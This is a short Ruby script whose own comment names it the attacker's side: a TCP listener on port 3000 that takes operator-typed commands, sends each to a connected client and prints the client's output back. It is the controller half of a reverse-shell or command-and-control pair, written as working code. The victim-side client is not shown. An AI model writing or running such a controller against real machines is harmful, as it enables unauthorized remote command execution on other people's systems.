# Run: ruby server.rb, accepts incoming connections, aka attacker

require 'socket'

PORT = 3000;

server = TCPServer.new(PORT);

loop do
	client = server.accept;

	print(">> ");
	command = gets.chomp;

	client.puts(command); # send command to connected client

	puts("#{client.read}\n");

	client.close;
end
